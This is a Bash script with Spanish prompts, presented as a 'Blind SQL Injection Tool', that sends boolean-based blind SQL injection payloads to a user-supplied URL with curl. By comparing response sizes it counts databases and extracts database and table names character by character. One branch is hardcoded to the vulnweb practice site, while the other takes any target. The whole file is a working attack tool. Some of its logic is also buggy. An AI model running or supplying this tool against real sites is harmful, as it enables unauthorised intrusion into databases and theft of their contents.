#!/bin/bash

clear

echo -e "\033[1;31m██████╗░░█████╗░██╗░░░██╗██╗██████╗░░█████╗░██╗░░░░░░█████╗░"
echo "██╔══██╗██╔══██╗██║░░░██║██║██╔══██╗██╔══██╗██║░░░░░██╔══██╗"
echo "██║░░██║███████║╚██╗░██╔╝██║██║░░██║██║░░██║██║░░░░░██║░░██║"
echo "██║░░██║██╔══██║░╚████╔╝░██║██║░░██║██║░░██║██║░░░░░██║░░██║"
echo "██████╔╝██║░░██║░░╚██╔╝░░██║██████╔╝╚█████╔╝███████╗╚█████╔╝"
echo -e "╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝╚═════╝░░╚════╝░╚══════╝░╚════╝░\033[0m"

echo -e "\033[1;31mWelcome to the Blind SQL Injection Tool\033[0m"
echo "---------------------------------------"
echo "1. Encontrar el numero de bases de datos"
echo "2. Obtener el nombre de las bases de datos y sus tablas"
echo "3. Encontrar el numero de bases de datos y obtener su nombre"
echo "Seleccione una opcion: "
read -r ACTION

echo "Seleccionar metodo HTTP:"
echo "1. GET"
echo "2. POST"
read -r METHOD_CHOICE

METHOD="GET"
COOKIES=""

echo "Introducir URL: "
read -r URL

echo "Introduce el parametro (e.g., id): "
read -r PARAMETER

if [[ "$METHOD_CHOICE" -eq 2 ]]; then
	METHOD="POST"
	echo "Introduce las cookies si existen (formato 'cookieName1=cookieValue1; cookieName2=cookieValue2') o presiona intro para omitir:"
	read -r COOKIES
fi


send_request() {

	if [[ "$METHOD_CHOICE" -eq 1 ]]; then

		local query="$1"
		local url=$URL  
		local injection="${PARAMETER}=${query}"
		local result

		if [ "$METHOD" == "POST" ]; then
			# Incluye las cookies solo si están definidas
			if [ -n "$COOKIES" ]; then
				result=$(curl -s -X POST --data "$injection" "$url" -b "$COOKIES" -w "%{size_download}\n" -o /dev/null)
			else
				result=$(curl -s -X POST --data "$injection" "$url" -w "%{size_download}\n" -o /dev/null)
			fi
		else
			result=$(curl -s -G --data-urlencode "$injection" "$url" -w "%{size_download}\n" -o /dev/null)
		fi

		echo $result

	elif [[ "$METHOD_CHOICE" -eq 2 ]]; then


		local data="uname=${1}&pass=${2}"
		local url="http://testphp.vulnweb.com/userinfo.php"  

		# CURL command with headers from the captured request
		curl -s -X POST "$url" \
			-H 'Host: testphp.vulnweb.com' \
			-H 'Cache-Control: max-age=0' \
			-H 'Upgrade-Insecure-Requests: 1' \
			-H 'Origin: http://testphp.vulnweb.com' \
			-H 'Content-Type: application/x-www-form-urlencoded' \
			-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36' \
			-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
			-H 'Referer: http://testphp.vulnweb.com/login.php' \
			-H 'Accept-Encoding: gzip, deflate, br' \
			-H 'Accept-Language: es-ES,es;q=0.9' \
			--data "$data" \
			-w "%{size_download}\n" \
			-o /dev/null
	fi
}
extract_length() {
	local test_length
	local length
	local response_lengths=()
	local significant_difference=10
	local base_length=$(send_request "1' and '1'='2" -- -)

	for length in {1..20}; do
		test_length=$(send_request "1' or (select count(schema_name) from information_schema.schemata)=$length-- -")
		response_lengths[$length]=$test_length

		if [ "$test_length" -ne "$base_length" ]; then
			echo $length
			return 0
		fi
	done
	echo 0
	return 0
}

extract_number_of_tables() {
	local db_name=$1
	local num_tables=0
	local reference_length=$(send_request "1' AND '1'='2" -- -) # Una consulta que siempre será falsa
	local current_length

    # Probamos con números crecientes hasta que encontremos uno que no tenga correspondencia.
    for ((i=1; i<=100; i++)); do
	    local query="1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='${db_name}')=${i} AND '1'='1"
	    current_length=$(send_request "$query")
	    if [[ "$current_length" != "$reference_length" ]]; then
		    num_tables=$i
	    else
		    break
	    fi
    done

    echo $num_tables
}

brute_force_table_names() {
	local db_name=$1
	echo "Extrayendo nombre de tablas de la base de datos: $db_name"

    local max_tables=100  
    local table_name
    local found_char
    local position
    local current_length
    local reference_length=$(send_request "1' AND '1'='2" -- -)

    # Múltiples nombres de tabla
    for ((table_index=1; table_index<=max_tables; table_index++)); do
	    table_name=""
	    position=1
	    while : ; do
		    found_char=false
		    for ascii in {48..57} {65..90} {97..122} 95 ; do # Números, letras y barra baja
			    if [[ "$ascii" == 95 ]]; then
				    char="_"
			    else
				    char=$(printf "\\$(printf '%03o' $ascii)")
			    fi
			    # La consulta SQL real va aquí
			    local query="1' OR ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='${db_name}' ORDER BY table_name LIMIT 1 OFFSET $((table_index - 1))), $position, 1))='$ascii'-- -"
			    current_length=$(send_request "$query")
			    if [[ "$current_length" != "$reference_length" ]]; then
				    table_name+="$char"
				    found_char=true
				    break
			    fi
		    done
		    if ! $found_char; then
			    break
		    fi
		    ((position++))
	    done
	    if [[ -z "$table_name" ]]; then
		    # Si no encontramos un nombre de tabla, no hay más tablas
		    break
	    fi
	    echo -e "\033[0;36mTabla encontrada:\033[0m $table_name"
    done
}

brute_force_db_names() {
	local number_of_databases=$1
	local db_name
	local current_length
	local reference_length=$(send_request "1' AND '1'='1" -- -)
	#echo "Longitud de referencia: $reference_length"

	for ((db_index=1; db_index<=number_of_databases; db_index++)); do
		db_name=""
		local position=1
		echo -e "\033[0;31mEjerciendo fuerza bruta sobre el nombre de la base $db_index...\033[0m"
		while : ; do
			local found_char=false
			for ascii in {48..57} {65..90} {97..122} 95 ; do 
				if [[ "$ascii" -eq 95 ]]; then
					char="_"
				else
					char=$(printf "\\$(printf '%03o' "$ascii")")
				fi
				local query="${PARAMETER}=' OR ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET $((db_index - 1))), $position, 1))=$ascii -- -"
				#echo "Probando: $query"
				current_length=$(send_request "$query")
				#echo "Longitud actual: $current_length"

				if [[ "$current_length" != "$reference_length" ]]; then
					db_name+="$char"
					echo -n "$char"
					found_char=true
					break
				fi
			done
			if ! $found_char; then
				if [ -n "$db_name" ]; then
					echo -e "\033[0;34m\nTerminada la fuerza bruta sobre la base de datos $db_index :\033[0m $db_name"
					brute_force_table_names "$db_name"
				fi
				break
			fi
			((position++))
		done
	done
}

brute_force_all(){
	extract_length
	local num_dbs=$(extract_length)
	if [ "$num_dbs" -gt 0 ]; then
		brute_force_db_names "$num_dbs"
		for ((db_index=1; db_index<=num_dbs; db_index++)); do
			local db_name=$(send_request "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET $((db_index - 1))") r
			brute_force_table_names "$db_name"
		done
	else
		echo "Error al extraer el numero de bases de datos."
	fi
}

list_items() {
	case "$ACTION" in
		1)
			extract_length
			;;
		2)
			local num_dbs=$(extract_length)
			if [ "$num_dbs" -gt 0 ]; then
				brute_force_db_names "$num_dbs"
			else
				echo "Error al encontrar el numero de bases de datos"
			fi
			;;
		3)
			brute_force_all
			;;
		*)
			echo "Opcion invalida."
			exit 1
			;;
	esac
}

list_items

